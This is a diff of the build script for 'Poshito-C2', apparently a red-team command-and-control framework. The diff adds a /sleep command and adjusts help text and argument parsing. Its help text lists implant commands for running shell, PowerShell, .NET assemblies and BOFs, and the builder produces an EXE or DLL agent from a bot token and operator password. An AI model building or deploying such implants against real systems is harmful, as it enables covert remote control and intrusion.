@@ -1,5 +1,5 @@
-import os
-import sys
+#!/usr/bin/env python3
+ 
 import string
 import secrets
 import hashlib
@@ -8,7 +8,6 @@ import subprocess
 
 
 poshito_help = """
-
 /info       Send information 
 /cmd        Execute a command               < command >
 /iex        Execute a Powershell command    < powershell command >
@@ -20,6 +19,7 @@ poshito_help = """
 /asm        Execute .NET assembly           < (assembly file | assembly hash) + assembly arguments >
 /bof        Execute BOF                     < bof file + bof arguments >    
 /die        Kill agent
+/sleep      Change sleep time               < seconds > < jitter % >
 """
 
 output_exe = "Poshito.exe"
@@ -66,6 +66,7 @@ def write_config_file(name, content):
 
 def main():
     parser = argparse.ArgumentParser(prog="build", description="Poshito-C2 agent builder")
+
     parser.add_argument("bot_token", help="Bot token")
     parser.add_argument("password", help="Operator password")
     parser.add_argument("format", help="Payload format", choices=["exe", "dll"])
@@ -78,7 +79,7 @@ def main():
                         help="dll export name (default: DllRegisterServer)", 
                         default="DllRegisterServer")
     parser.add_argument("-st", "--sleep-time",
-                        help="time to sleep between callback", default="5")
+                        help="time to sleep between callbacks", default="5")
     parser.add_argument("-sj", "--sleep-jitter", metavar="<percent (%)>", 
                         help="sleep time jitter in percent", default="0")
     args = parser.parse_args()
